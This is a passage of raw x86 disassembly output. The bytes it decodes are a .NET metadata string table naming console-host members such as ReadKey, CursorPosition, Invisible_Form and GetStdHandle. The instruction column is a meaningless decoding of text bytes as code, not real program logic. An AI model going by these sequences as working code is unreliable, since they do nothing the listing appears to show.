  407844:	6f                   	outsl  %ds:(%esi),(%dx)
  407845:	72 00                	jb     0x407847
  407847:	67 65 74 5f          	addr16 gs je 0x4078aa
  40784b:	42                   	inc    %edx
  40784c:	61                   	popa
  40784d:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407850:	72 6f                	jb     0x4078c1
  407852:	75 6e                	jne    0x4078c2
  407854:	64 43                	fs inc %ebx
  407856:	6f                   	outsl  %ds:(%esi),(%dx)
  407857:	6c                   	insb   (%dx),%es:(%edi)
  407858:	6f                   	outsl  %ds:(%esi),(%dx)
  407859:	72 00                	jb     0x40785b
  40785b:	73 65                	jae    0x4078c2
  40785d:	74 5f                	je     0x4078be
  40785f:	42                   	inc    %edx
  407860:	61                   	popa
  407861:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407864:	72 6f                	jb     0x4078d5
  407866:	75 6e                	jne    0x4078d6
  407868:	64 43                	fs inc %ebx
  40786a:	6f                   	outsl  %ds:(%esi),(%dx)
  40786b:	6c                   	insb   (%dx),%es:(%edi)
  40786c:	6f                   	outsl  %ds:(%esi),(%dx)
  40786d:	72 00                	jb     0x40786f
  40786f:	53                   	push   %ebx
  407870:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407877:	5f                   	pop    %edi
  407878:	42                   	inc    %edx
  407879:	75 66                	jne    0x4078e1
  40787b:	66 65 72 53          	data16 gs jb 0x4078d2
  40787f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407886:	5f                   	pop    %edi
  407887:	42                   	inc    %edx
  407888:	75 66                	jne    0x4078f0
  40788a:	66 65 72 53          	data16 gs jb 0x4078e1
  40788e:	69 7a 65 00 43 6f 6f 	imul   $0x6f6f4300,0x65(%edx),%edi
  407895:	72 64                	jb     0x4078fb
  407897:	69 6e 61 74 65 73 00 	imul   $0x736574,0x61(%esi),%ebp
  40789e:	67 65 74 5f          	addr16 gs je 0x407901
  4078a2:	43                   	inc    %ebx
  4078a3:	75 72                	jne    0x407917
  4078a5:	73 6f                	jae    0x407916
  4078a7:	72 50                	jb     0x4078f9
  4078a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078aa:	73 69                	jae    0x407915
  4078ac:	74 69                	je     0x407917
  4078ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4078af:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b0:	00 73 65             	add    %dh,0x65(%ebx)
  4078b3:	74 5f                	je     0x407914
  4078b5:	43                   	inc    %ebx
  4078b6:	75 72                	jne    0x40792a
  4078b8:	73 6f                	jae    0x407929
  4078ba:	72 50                	jb     0x40790c
  4078bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078bd:	73 69                	jae    0x407928
  4078bf:	74 69                	je     0x40792a
  4078c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c3:	00 67 65             	add    %ah,0x65(%edi)
  4078c6:	74 5f                	je     0x407927
  4078c8:	43                   	inc    %ebx
  4078c9:	75 72                	jne    0x40793d
  4078cb:	73 6f                	jae    0x40793c
  4078cd:	72 53                	jb     0x407922
  4078cf:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4078d6:	5f                   	pop    %edi
  4078d7:	43                   	inc    %ebx
  4078d8:	75 72                	jne    0x40794c
  4078da:	73 6f                	jae    0x40794b
  4078dc:	72 53                	jb     0x407931
  4078de:	69 7a 65 00 49 6e 76 	imul   $0x766e4900,0x65(%edx),%edi
  4078e5:	69 73 69 62 6c 65 5f 	imul   $0x5f656c62,0x69(%ebx),%esi
  4078ec:	46                   	inc    %esi
  4078ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ee:	72 6d                	jb     0x40795d
  4078f0:	00 46 6c             	add    %al,0x6c(%esi)
  4078f3:	75 73                	jne    0x407968
  4078f5:	68 49 6e 70 75       	push   $0x75706e49
  4078fa:	74 42                	je     0x40793e
  4078fc:	75 66                	jne    0x407964
  4078fe:	66 65 72 00          	data16 gs jb 0x407902
  407902:	67 65 74 5f          	addr16 gs je 0x407965
  407906:	46                   	inc    %esi
  407907:	6f                   	outsl  %ds:(%esi),(%dx)
  407908:	72 65                	jb     0x40796f
  40790a:	67 72 6f             	addr16 jb 0x40797c
  40790d:	75 6e                	jne    0x40797d
  40790f:	64 43                	fs inc %ebx
  407911:	6f                   	outsl  %ds:(%esi),(%dx)
  407912:	6c                   	insb   (%dx),%es:(%edi)
  407913:	6f                   	outsl  %ds:(%esi),(%dx)
  407914:	72 00                	jb     0x407916
  407916:	73 65                	jae    0x40797d
  407918:	74 5f                	je     0x407979
  40791a:	46                   	inc    %esi
  40791b:	6f                   	outsl  %ds:(%esi),(%dx)
  40791c:	72 65                	jb     0x407983
  40791e:	67 72 6f             	addr16 jb 0x407990
  407921:	75 6e                	jne    0x407991
  407923:	64 43                	fs inc %ebx
  407925:	6f                   	outsl  %ds:(%esi),(%dx)
  407926:	6c                   	insb   (%dx),%es:(%edi)
  407927:	6f                   	outsl  %ds:(%esi),(%dx)
  407928:	72 00                	jb     0x40792a
  40792a:	42                   	inc    %edx
  40792b:	75 66                	jne    0x407993
  40792d:	66 65 72 43          	data16 gs jb 0x407974
  407931:	65 6c                	gs insb (%dx),%es:(%edi)
  407933:	6c                   	insb   (%dx),%es:(%edi)
  407934:	00 52 65             	add    %dl,0x65(%edx)
  407937:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  40793b:	67 6c                	insb   (%dx),%es:(%di)
  40793d:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407941:	74 42                	je     0x407985
  407943:	75 66                	jne    0x4079ab
  407945:	66 65 72 43          	data16 gs jb 0x40798c
  407949:	6f                   	outsl  %ds:(%esi),(%dx)
  40794a:	6e                   	outsb  %ds:(%esi),(%dx)
  40794b:	74 65                	je     0x4079b2
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	74 73                	je     0x4079c3
  407950:	00 67 65             	add    %ah,0x65(%edi)
  407953:	74 5f                	je     0x4079b4
  407955:	4b                   	dec    %ebx
  407956:	65 79 41             	gs jns 0x40799a
  407959:	76 61                	jbe    0x4079bc
  40795b:	69 6c 61 62 6c 65 00 	imul   $0x6700656c,0x62(%ecx,%eiz,2),%ebp
  407962:	67 
  407963:	65 74 5f             	gs je  0x4079c5
  407966:	4d                   	dec    %ebp
  407967:	61                   	popa
  407968:	78 50                	js     0x4079ba
  40796a:	68 79 73 69 63       	push   $0x63697379
  40796f:	61                   	popa
  407970:	6c                   	insb   (%dx),%es:(%edi)
  407971:	57                   	push   %edi
  407972:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407979:	7a 65                	jp     0x4079e0
  40797b:	00 67 65             	add    %ah,0x65(%edi)
  40797e:	74 5f                	je     0x4079df
  407980:	4d                   	dec    %ebp
  407981:	61                   	popa
  407982:	78 57                	js     0x4079db
  407984:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  40798b:	7a 65                	jp     0x4079f2
  40798d:	00 4b 65             	add    %cl,0x65(%ebx)
  407990:	79 49                	jns    0x4079db
  407992:	6e                   	outsb  %ds:(%esi),(%dx)
  407993:	66 6f                	outsw  %ds:(%esi),(%dx)
  407995:	00 52 65             	add    %dl,0x65(%edx)
  407998:	61                   	popa
  407999:	64 4b                	fs dec %ebx
  40799b:	65 79 4f             	gs jns 0x4079ed
  40799e:	70 74                	jo     0x407a14
  4079a0:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  4079a7:	61                   	popa
  4079a8:	64 4b                	fs dec %ebx
  4079aa:	65 79 00             	gs jns 0x4079ad
  4079ad:	53                   	push   %ebx
  4079ae:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4079b1:	6c                   	insb   (%dx),%es:(%edi)
  4079b2:	6c                   	insb   (%dx),%es:(%edi)
  4079b3:	42                   	inc    %edx
  4079b4:	75 66                	jne    0x407a1c
  4079b6:	66 65 72 43          	data16 gs jb 0x4079fd
  4079ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4079bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4079bc:	74 65                	je     0x407a23
  4079be:	6e                   	outsb  %ds:(%esi),(%dx)
  4079bf:	74 73                	je     0x407a34
  4079c1:	00 53 65             	add    %dl,0x65(%ebx)
  4079c4:	74 42                	je     0x407a08
  4079c6:	75 66                	jne    0x407a2e
  4079c8:	66 65 72 43          	data16 gs jb 0x407a0f
  4079cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4079cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ce:	74 65                	je     0x407a35
  4079d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d1:	74 73                	je     0x407a46
  4079d3:	00 67 65             	add    %ah,0x65(%edi)
  4079d6:	74 5f                	je     0x407a37
  4079d8:	57                   	push   %edi
  4079d9:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4079e0:	73 69                	jae    0x407a4b
  4079e2:	74 69                	je     0x407a4d
  4079e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4079e6:	00 73 65             	add    %dh,0x65(%ebx)
  4079e9:	74 5f                	je     0x407a4a
  4079eb:	57                   	push   %edi
  4079ec:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4079f3:	73 69                	jae    0x407a5e
  4079f5:	74 69                	je     0x407a60
  4079f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f9:	00 67 65             	add    %ah,0x65(%edi)
  4079fc:	74 5f                	je     0x407a5d
  4079fe:	57                   	push   %edi
  4079ff:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407a06:	7a 65                	jp     0x407a6d
  407a08:	00 73 65             	add    %dh,0x65(%ebx)
  407a0b:	74 5f                	je     0x407a6c
  407a0d:	57                   	push   %edi
  407a0e:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407a15:	7a 65                	jp     0x407a7c
  407a17:	00 67 65             	add    %ah,0x65(%edi)
  407a1a:	74 5f                	je     0x407a7b
  407a1c:	57                   	push   %edi
  407a1d:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407a24:	74 6c                	je     0x407a92
  407a26:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407a2a:	74 5f                	je     0x407a8b
  407a2c:	57                   	push   %edi
  407a2d:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407a34:	74 6c                	je     0x407aa2
  407a36:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  407a3a:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407a3d:	72 6f                	jb     0x407aae
  407a3f:	75 6e                	jne    0x407aaf
  407a41:	64 43                	fs inc %ebx
  407a43:	6f                   	outsl  %ds:(%esi),(%dx)
  407a44:	6c                   	insb   (%dx),%es:(%edi)
  407a45:	6f                   	outsl  %ds:(%esi),(%dx)
  407a46:	72 00                	jb     0x407a48
  407a48:	42                   	inc    %edx
  407a49:	75 66                	jne    0x407ab1
  407a4b:	66 65 72 53          	data16 gs jb 0x407aa2
  407a4f:	69 7a 65 00 43 75 72 	imul   $0x72754300,0x65(%edx),%edi
  407a56:	73 6f                	jae    0x407ac7
  407a58:	72 50                	jb     0x407aaa
  407a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a5b:	73 69                	jae    0x407ac6
  407a5d:	74 69                	je     0x407ac8
  407a5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a60:	6e                   	outsb  %ds:(%esi),(%dx)
  407a61:	00 43 75             	add    %al,0x75(%ebx)
  407a64:	72 73                	jb     0x407ad9
  407a66:	6f                   	outsl  %ds:(%esi),(%dx)
  407a67:	72 53                	jb     0x407abc
  407a69:	69 7a 65 00 46 6f 72 	imul   $0x726f4600,0x65(%edx),%edi
  407a70:	65 67 72 6f          	gs addr16 jb 0x407ae3
  407a74:	75 6e                	jne    0x407ae4
  407a76:	64 43                	fs inc %ebx
  407a78:	6f                   	outsl  %ds:(%esi),(%dx)
  407a79:	6c                   	insb   (%dx),%es:(%edi)
  407a7a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a7b:	72 00                	jb     0x407a7d
  407a7d:	4b                   	dec    %ebx
  407a7e:	65 79 41             	gs jns 0x407ac2
  407a81:	76 61                	jbe    0x407ae4
  407a83:	69 6c 61 62 6c 65 00 	imul   $0x4d00656c,0x62(%ecx,%eiz,2),%ebp
  407a8a:	4d 
  407a8b:	61                   	popa
  407a8c:	78 50                	js     0x407ade
  407a8e:	68 79 73 69 63       	push   $0x63697379
  407a93:	61                   	popa
  407a94:	6c                   	insb   (%dx),%es:(%edi)
  407a95:	57                   	push   %edi
  407a96:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407a9d:	7a 65                	jp     0x407b04
  407a9f:	00 4d 61             	add    %cl,0x61(%ebp)
  407aa2:	78 57                	js     0x407afb
  407aa4:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407aab:	7a 65                	jp     0x407b12
  407aad:	00 57 69             	add    %dl,0x69(%edi)
  407ab0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab1:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ab3:	77 50                	ja     0x407b05
  407ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ab6:	73 69                	jae    0x407b21
  407ab8:	74 69                	je     0x407b23
  407aba:	6f                   	outsl  %ds:(%esi),(%dx)
  407abb:	6e                   	outsb  %ds:(%esi),(%dx)
  407abc:	00 57 69             	add    %dl,0x69(%edi)
  407abf:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac0:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ac2:	77 53                	ja     0x407b17
  407ac4:	69 7a 65 00 57 69 6e 	imul   $0x6e695700,0x65(%edx),%edi
  407acb:	64 6f                	outsl  %fs:(%esi),(%dx)
  407acd:	77 54                	ja     0x407b23
  407acf:	69 74 6c 65 00 4d 42 	imul   $0x5f424d00,0x65(%esp,%ebp,2),%esi
  407ad6:	5f 
  407ad7:	47                   	inc    %edi
  407ad8:	65 74 53             	gs je  0x407b2e
  407adb:	74 72                	je     0x407b4f
  407add:	69 6e 67 00 44 69 61 	imul   $0x61694400,0x67(%esi),%ebp
  407ae4:	6c                   	insb   (%dx),%es:(%edi)
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	67 52                	addr16 push %edx
  407ae8:	65 73 75             	gs jae 0x407b60
  407aeb:	6c                   	insb   (%dx),%es:(%edi)
  407aec:	74 00                	je     0x407aee
  407aee:	53                   	push   %ebx
  407aef:	68 6f 77 00 53       	push   $0x5300776f
  407af4:	79 73                	jns    0x407b69
  407af6:	74 65                	je     0x407b5d
  407af8:	6d                   	insl   (%dx),%es:(%edi)
  407af9:	2e 43                	cs inc %ebx
  407afb:	6f                   	outsl  %ds:(%esi),(%dx)
  407afc:	6c                   	insb   (%dx),%es:(%edi)
  407afd:	6c                   	insb   (%dx),%es:(%edi)
  407afe:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407b03:	6e                   	outsb  %ds:(%esi),(%dx)
  407b04:	73 2e                	jae    0x407b34
  407b06:	4f                   	dec    %edi
  407b07:	62 6a 65             	bound  %ebp,0x65(%edx)
  407b0a:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  407b0e:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407b11:	00 43 6f             	add    %al,0x6f(%ebx)
  407b14:	6c                   	insb   (%dx),%es:(%edi)
  407b15:	6c                   	insb   (%dx),%es:(%edi)
  407b16:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407b1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1c:	60                   	pusha
  407b1d:	31 00                	xor    %eax,(%eax)
  407b1f:	43                   	inc    %ebx
  407b20:	68 6f 69 63 65       	push   $0x6563696f
  407b25:	44                   	inc    %esp
  407b26:	65 73 63             	gs jae 0x407b8c
  407b29:	72 69                	jb     0x407b94
  407b2b:	70 74                	jo     0x407ba1
  407b2d:	69 6f 6e 00 54 6f 55 	imul   $0x556f5400,0x6e(%edi),%ebp
  407b34:	6e                   	outsb  %ds:(%esi),(%dx)
  407b35:	69 63 6f 64 65 00 4b 	imul   $0x4b006564,0x6f(%ebx),%esp
  407b3c:	65 79 73             	gs jns 0x407bb2
  407b3f:	00 47 65             	add    %al,0x65(%edi)
  407b42:	74 43                	je     0x407b87
  407b44:	68 61 72 46 72       	push   $0x72467261
  407b49:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4a:	6d                   	insl   (%dx),%es:(%edi)
  407b4b:	4b                   	dec    %ebx
  407b4c:	65 79 73             	gs jns 0x407bc2
  407b4f:	00 63 68             	add    %ah,0x68(%ebx)
  407b52:	65 63 6b 4b          	arpl   %ebp,%gs:0x4b(%ebx)
  407b56:	65 79 44             	gs jns 0x407b9d
  407b59:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5a:	77 6e                	ja     0x407bca
  407b5c:	00 6b 65             	add    %ch,0x65(%ebx)
  407b5f:	79 69                	jns    0x407bca
  407b61:	6e                   	outsb  %ds:(%esi),(%dx)
  407b62:	66 6f                	outsw  %ds:(%esi),(%dx)
  407b64:	00 4b 65             	add    %cl,0x65(%ebx)
  407b67:	79 45                	jns    0x407bae
  407b69:	76 65                	jbe    0x407bd0
  407b6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6c:	74 41                	je     0x407baf
  407b6e:	72 67                	jb     0x407bd7
  407b70:	73 00                	jae    0x407b72
  407b72:	4b                   	dec    %ebx
  407b73:	65 79 62             	gs jns 0x407bd8
  407b76:	6f                   	outsl  %ds:(%esi),(%dx)
  407b77:	61                   	popa
  407b78:	72 64                	jb     0x407bde
  407b7a:	5f                   	pop    %edi
  407b7b:	46                   	inc    %esi
  407b7c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7d:	72 6d                	jb     0x407bec
  407b7f:	5f                   	pop    %edi
  407b80:	4b                   	dec    %ebx
  407b81:	65 79 44             	gs jns 0x407bc8
  407b84:	6f                   	outsl  %ds:(%esi),(%dx)
  407b85:	77 6e                	ja     0x407bf5
  407b87:	00 4b 65             	add    %cl,0x65(%ebx)
  407b8a:	79 62                	jns    0x407bee
  407b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8d:	61                   	popa
  407b8e:	72 64                	jb     0x407bf4
  407b90:	5f                   	pop    %edi
  407b91:	46                   	inc    %esi
  407b92:	6f                   	outsl  %ds:(%esi),(%dx)
  407b93:	72 6d                	jb     0x407c02
  407b95:	5f                   	pop    %edi
  407b96:	4b                   	dec    %ebx
  407b97:	65 79 55             	gs jns 0x407bef
  407b9a:	70 00                	jo     0x407b9c
  407b9c:	50                   	push   %eax
  407b9d:	72 6f                	jb     0x407c0e
  407b9f:	67 72 65             	addr16 jb 0x407c07
  407ba2:	73 73                	jae    0x407c17
  407ba4:	42                   	inc    %edx
  407ba5:	61                   	popa
  407ba6:	72 43                	jb     0x407beb
  407ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ba9:	6c                   	insb   (%dx),%es:(%edi)
  407baa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bab:	72 00                	jb     0x407bad
  407bad:	53                   	push   %ebx
  407bae:	79 73                	jns    0x407c23
  407bb0:	74 65                	je     0x407c17
  407bb2:	6d                   	insl   (%dx),%es:(%edi)
  407bb3:	2e 54                	cs push %esp
  407bb5:	69 6d 65 72 73 00 54 	imul   $0x54007372,0x65(%ebp),%ebp
  407bbc:	69 6d 65 72 00 74 69 	imul   $0x69740072,0x65(%ebp),%ebp
  407bc3:	6d                   	insl   (%dx),%es:(%edi)
  407bc4:	65 72 00             	gs jb  0x407bc7
  407bc7:	62 61 72             	bound  %esp,0x72(%ecx)
  407bca:	4e                   	dec    %esi
  407bcb:	75 6d                	jne    0x407c3a
  407bcd:	62 65 72             	bound  %esp,0x72(%ebp)
  407bd0:	00 62 61             	add    %ah,0x61(%edx)
  407bd3:	72 56                	jb     0x407c2b
  407bd5:	61                   	popa
  407bd6:	6c                   	insb   (%dx),%es:(%edi)
  407bd7:	75 65                	jne    0x407c3e
  407bd9:	00 69 6e             	add    %ch,0x6e(%ecx)
  407bdc:	54                   	push   %esp
  407bdd:	69 63 6b 00 53 79 73 	imul   $0x73795300,0x6b(%ebx),%esp
  407be4:	74 65                	je     0x407c4b
  407be6:	6d                   	insl   (%dx),%es:(%edi)
  407be7:	2e 43                	cs inc %ebx
  407be9:	6f                   	outsl  %ds:(%esi),(%dx)
  407bea:	6c                   	insb   (%dx),%es:(%edi)
  407beb:	6c                   	insb   (%dx),%es:(%edi)
  407bec:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf2:	73 2e                	jae    0x407c22
  407bf4:	47                   	inc    %edi
  407bf5:	65 6e                	outsb  %gs:(%esi),(%dx)
  407bf7:	65 72 69             	gs jb  0x407c63
  407bfa:	63 00                	arpl   %eax,(%eax)
  407bfc:	4c                   	dec    %esp
  407bfd:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  407c04:	72 6f                	jb     0x407c75
  407c06:	67 72 65             	addr16 jb 0x407c6e
  407c09:	73 73                	jae    0x407c7e
  407c0b:	44                   	inc    %esp
  407c0c:	61                   	popa
  407c0d:	74 61                	je     0x407c70
  407c0f:	4c                   	dec    %esp
  407c10:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  407c17:	74 65                	je     0x407c7e
  407c19:	6d                   	insl   (%dx),%es:(%edi)
  407c1a:	2e 44                	cs inc %esp
  407c1c:	72 61                	jb     0x407c7f
  407c1e:	77 69                	ja     0x407c89
  407c20:	6e                   	outsb  %ds:(%esi),(%dx)
  407c21:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  407c25:	6c                   	insb   (%dx),%es:(%edi)
  407c26:	6f                   	outsl  %ds:(%esi),(%dx)
  407c27:	72 00                	jb     0x407c29
  407c29:	44                   	inc    %esp
  407c2a:	72 61                	jb     0x407c8d
  407c2c:	77 69                	ja     0x407c97
  407c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2f:	67 43                	addr16 inc %ebx
  407c31:	6f                   	outsl  %ds:(%esi),(%dx)
  407c32:	6c                   	insb   (%dx),%es:(%edi)
  407c33:	6f                   	outsl  %ds:(%esi),(%dx)
  407c34:	72 00                	jb     0x407c36
  407c36:	49                   	dec    %ecx
  407c37:	6e                   	outsb  %ds:(%esi),(%dx)
  407c38:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407c3f:	65 
  407c40:	43                   	inc    %ebx
  407c41:	6f                   	outsl  %ds:(%esi),(%dx)
  407c42:	6d                   	insl   (%dx),%es:(%edi)
  407c43:	70 6f                	jo     0x407cb4
  407c45:	6e                   	outsb  %ds:(%esi),(%dx)
  407c46:	65 6e                	outsb  %gs:(%esi),(%dx)
  407c48:	74 00                	je     0x407c4a
  407c4a:	45                   	inc    %ebp
  407c4b:	6c                   	insb   (%dx),%es:(%edi)
  407c4c:	61                   	popa
  407c4d:	70 73                	jo     0x407cc2
  407c4f:	65 64 45             	gs fs inc %ebp
  407c52:	76 65                	jbe    0x407cb9
  407c54:	6e                   	outsb  %ds:(%esi),(%dx)
  407c55:	74 41                	je     0x407c98
  407c57:	72 67                	jb     0x407cc0
  407c59:	73 00                	jae    0x407c5b
  407c5b:	54                   	push   %esp
  407c5c:	69 6d 65 54 69 63 6b 	imul   $0x6b636954,0x65(%ebp),%ebp
  407c63:	00 41 64             	add    %al,0x64(%ecx)
  407c66:	64 42                	fs inc %edx
  407c68:	61                   	popa
  407c69:	72 00                	jb     0x407c6b
  407c6b:	47                   	inc    %edi
  407c6c:	65 74 43             	gs je  0x407cb2
  407c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c70:	75 6e                	jne    0x407ce0
  407c72:	74 00                	je     0x407c74
  407c74:	50                   	push   %eax
  407c75:	72 6f                	jb     0x407ce6
  407c77:	67 72 65             	addr16 jb 0x407cdf
  407c7a:	73 73                	jae    0x407cef
  407c7c:	52                   	push   %edx
  407c7d:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  407c81:	64 00 55 70          	add    %dl,%fs:0x70(%ebp)
  407c85:	64 61                	fs popa
  407c87:	74 65                	je     0x407cee
  407c89:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  407c8d:	65 6c                	gs insb (%dx),%es:(%edi)
  407c8f:	00 6c 62 41          	add    %ch,0x41(%edx,%eiz,2)
  407c93:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c97:	69 74 79 00 6c 62 53 	imul   $0x7453626c,0x0(%ecx,%edi,2),%esi
  407c9e:	74 
  407c9f:	61                   	popa
  407ca0:	74 75                	je     0x407d17
  407ca2:	73 00                	jae    0x407ca4
  407ca4:	50                   	push   %eax
  407ca5:	72 6f                	jb     0x407d16
  407ca7:	67 72 65             	addr16 jb 0x407d0f
  407caa:	73 73                	jae    0x407d1f
  407cac:	42                   	inc    %edx
  407cad:	61                   	popa
  407cae:	72 00                	jb     0x407cb0
  407cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb1:	62 6a 50             	bound  %ebp,0x50(%edx)
  407cb4:	72 6f                	jb     0x407d25
  407cb6:	67 72 65             	addr16 jb 0x407d1e
  407cb9:	73 73                	jae    0x407d2e
  407cbb:	42                   	inc    %edx
  407cbc:	61                   	popa
  407cbd:	72 00                	jb     0x407cbf
  407cbf:	6c                   	insb   (%dx),%es:(%edi)
  407cc0:	62 52 65             	bound  %edx,0x65(%edx)
  407cc3:	6d                   	insl   (%dx),%es:(%edi)
  407cc4:	61                   	popa
  407cc5:	69 6e 69 6e 67 54 69 	imul   $0x6954676e,0x69(%esi),%ebp
  407ccc:	6d                   	insl   (%dx),%es:(%edi)
  407ccd:	65 00 6c 62 4f       	add    %ch,%gs:0x4f(%edx,%eiz,2)
  407cd2:	70 65                	jo     0x407d39
  407cd4:	72 61                	jb     0x407d37
  407cd6:	74 69                	je     0x407d41
  407cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cda:	00 41 63             	add    %al,0x63(%ecx)
  407cdd:	74 69                	je     0x407d48
  407cdf:	76 69                	jbe    0x407d4a
  407ce1:	74 79                	je     0x407d5c
  407ce3:	49                   	dec    %ecx
  407ce4:	64 00 50 61          	add    %dl,%fs:0x61(%eax)
  407ce8:	72 65                	jb     0x407d4f
  407cea:	6e                   	outsb  %ds:(%esi),(%dx)
  407ceb:	74 41                	je     0x407d2e
  407ced:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407cf1:	69 74 79 49 64 00 44 	imul   $0x65440064,0x49(%ecx,%edi,2),%esi
  407cf8:	65 
  407cf9:	70 74                	jo     0x407d6f
  407cfb:	68 00 47 65 74       	push   $0x74654700
  407d00:	53                   	push   %ebx
  407d01:	74 64                	je     0x407d67
  407d03:	48                   	dec    %eax
  407d04:	61                   	popa
  407d05:	6e                   	outsb  %ds:(%esi),(%dx)
  407d06:	64 6c                	fs insb (%dx),%es:(%edi)
  407d08:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407d0c:	74 46                	je     0x407d54
  407d0e:	69 6c 65 54 79 70 65 	imul   $0x657079,0x54(%ebp,%eiz,2),%ebp
  407d15:	00 
  407d16:	49                   	dec    %ecx
  407d17:	73 49                	jae    0x407d62
  407d19:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1a:	70 75                	jo     0x407d91
  407d1c:	74 52                	je     0x407d70
  407d1e:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407d25:	65 64 
  407d27:	00 49 73             	add    %cl,0x73(%ecx)
  407d2a:	4f                   	dec    %edi
  407d2b:	75 74                	jne    0x407da1
  407d2d:	70 75                	jo     0x407da4
  407d2f:	74 52                	je     0x407d83
  407d31:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407d38:	65 64 
  407d3a:	00 49 73             	add    %cl,0x73(%ecx)
  407d3d:	45                   	inc    %ebp
  407d3e:	72 72                	jb     0x407db2
  407d40:	6f                   	outsl  %ds:(%esi),(%dx)
  407d41:	72 52                	jb     0x407d95
  407d43:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407d4a:	65 64 
  407d4c:	00 46 49             	add    %al,0x49(%esi)
  407d4f:	4c                   	dec    %esp
  407d50:	45                   	inc    %ebp
  407d51:	5f                   	pop    %edi
  407d52:	54                   	push   %esp
  407d53:	59                   	pop    %ecx
  407d54:	50                   	push   %eax
  407d55:	45                   	inc    %ebp
  407d56:	5f                   	pop    %edi
  407d57:	55                   	push   %ebp
  407d58:	4e                   	dec    %esi
  407d59:	4b                   	dec    %ebx
  407d5a:	4e                   	dec    %esi
  407d5b:	4f                   	dec    %edi
  407d5c:	57                   	push   %edi
  407d5d:	4e                   	dec    %esi
  407d5e:	00 46 49             	add    %al,0x49(%esi)
  407d61:	4c                   	dec    %esp
